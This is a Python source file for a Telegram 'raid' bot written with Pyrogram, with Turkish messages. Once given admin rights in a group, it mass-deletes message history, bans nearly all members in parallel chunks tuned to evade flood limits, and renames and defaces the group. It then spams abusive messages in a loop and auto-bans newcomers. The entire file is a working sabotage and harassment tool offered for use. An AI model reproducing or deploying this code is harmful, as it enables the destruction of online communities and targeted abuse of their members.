import os
import asyncio
import logging
import random
from pyrogram import Client, filters, enums
from pyrogram.errors import FloodWait, ChatAdminRequired
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("WESTEROS-RAID-KARS-2026")

app = Client(
    name=":memory:",
    api_id=int(os.getenv("API_ID")),
    api_hash=os.getenv("API_HASH"),
    bot_token=os.getenv("BOT_TOKEN")
)



OWNER_ID = int(os.getenv("OWNER_ID"))
RAID_ACTIVE = {}  # chat_id bazlı raid durumu

def owner_only(func):
    async def wrapper(client, message):
        if message.from_user.id != OWNER_ID:
            return
        return await func(client, message)
    return wrapper

# ───────────── HIZLI KOMUTLAR ──────────────

@app.on_message(filters.command("fastnuke") & filters.group)
@owner_only
async def fast_nuke(client, message):
    chat = message.chat
    start_time = asyncio.get_event_loop().time()
    await message.reply_text("**FAST NUKE BAŞLIYOR – BAN YAĞMURU GELİYOR** ⚡☠️")

    deleted = 0
    banned = 0

    # Hızlı mesaj silme (paralel)
    delete_tasks = []
    try:
        async for msg in client.get_chat_history(chat.id, limit=1000):
            delete_tasks.append(msg.delete())
            deleted += 1
        await asyncio.gather(*delete_tasks, return_exceptions=True)
    except Exception as e:
        logger.warning(f"Mesaj silme hatası: {e}")

    # Hızlı ban – yüksek limit + chunk paralel
    ban_tasks = []
    try:
        async for member in client.get_chat_members(chat.id, limit=500):
            if member.user.is_bot or member.user.id == OWNER_ID:
                continue
            ban_tasks.append(client.ban_chat_member(chat.id, member.user.id))
            banned += 1

        # 15’li chunk’larla paralel ban (en güvenli hızlı seviye)
        chunk_size = 15
        for i in range(0, len(ban_tasks), chunk_size):
            chunk = ban_tasks[i:i + chunk_size]
            results = await asyncio.gather(*chunk, return_exceptions=True)
            for res in results:
                if isinstance(res, FloodWait):
                    await asyncio.sleep(max(1, res.value * 0.6))  # flood’u kısalttık
            await asyncio.sleep(0.08)  # chunk arası minimum bekleme

    except ChatAdminRequired:
        await message.reply_text("**Ban yetkim yok! Beni full admin yap.**")
        return
    except Exception as e:
        logger.error(f"Ban döngüsü hatası: {e}")

    # Grup ayarlarını hızlıca mahvet
    try:
        await client.set_chat_title(chat.id, f"FAST NUKED {random.randint(1000,9999)}")
        await client.set_chat_description(chat.id, "sntna. yıldırım hızıyla yok etti – bye 🖤")
        await client.set_chat_photo(chat.id, photo=None)
    except:
        pass

    duration = asyncio.get_event_loop().time() - start_time
    await message.reply_text(
        f"**FAST NUKE BİTTİ!**\n"
        f"Silinen mesaj ≈ {deleted}\n"
        f"Banlanan ≈ {banned}\n"
        f"Süre: **{duration:.1f} saniye** ⚡\n"
        f"RAID otomatik devam ediyor!"
    )

    # Raid’i başlat
    RAID_ACTIVE[chat.id] = True
    asyncio.create_task(raid_loop(client, chat.id))

# Raid döngüsü (otomatik spam + cevap)
async def raid_loop(client, chat_id):
    while RAID_ACTIVE.get(chat_id, False):
        try:
            await client.send_message(chat_id, random.choice([
                "WESTEROS RAID AKTİF 🔥", "KAÇAMAZSINIZ", "HERKES SİKİLDİ", "sntna. 2026 ⚡"
            ]))
            await asyncio.sleep(random.uniform(1.8, 3.5))
        except FloodWait as e:
            await asyncio.sleep(e.value + 3)
        except:
            break

@app.on_message(filters.new_chat_members)
async def auto_ban_new(client, message):
    chat_id = message.chat.id
    if not RAID_ACTIVE.get(chat_id, False):
        return
    for user in message.new_chat_members:
        if user.id == OWNER_ID:
            continue
        try:
            await client.ban_chat_member(chat_id, user.id)
            await client.send_message(chat_id, f"{user.first_name} girdi → BAN ⚡")
        except:
            pass

@app.on_message(filters.command(["startraid", "stopraid"]))
@owner_only
async def raid_control(client, message):
    chat_id = message.chat.id
    cmd = message.command[0]
    if cmd == "startraid":
        RAID_ACTIVE[chat_id] = True
        await message.reply_text("**RAID BAŞLADI – OTOMATİK BAN + SPAM** 🔥")
        asyncio.create_task(raid_loop(client, chat_id))
    else:
        RAID_ACTIVE[chat_id] = False
        await message.reply_text("**RAID DURDU** ❄️")

@app.on_message(filters.command("spam") & filters.group)
@owner_only
async def quick_spam(client, message):
    try:
        count = int(message.command[1])
        text = " ".join(message.command[2:]) or "WESTEROS FAST SPAM ⚡"
    except:
        return await message.reply_text("Kullanım: /spam 80 metin")

    for _ in range(count):
        try:
            await client.send_message(message.chat.id, text)
            await asyncio.sleep(0.4 + random.random() * 0.6)
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except:
            break

@app.on_message(filters.command("start"))
async def start_cmd(client, message):
    await message.reply_text(
        "**FAST RAID BOT 2026 – KARS**\n\n"
        "Komutlar (sadece owner):\n"
        "/fastnuke → en hızlı nuke + ban + raid\n"
        "/startraid → raid mod başlat (yeni giren ban, spam)\n"
        "/stopraid → raid durdur\n"
        "/spam <sayı> [metin] → hızlı spam\n\n"
        "Not: Botu full admin yap (ban + delete + change info yetkileri açık)"
    )

async def main():
    await app.start()
    me = await app.get_me()
    logger.info(f"FAST BOT AKTİF → @{me.username} | Westeros 2026")
    print("Railway hazır. Botu gruba ekle, full admin yap, /fastnuke dene.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
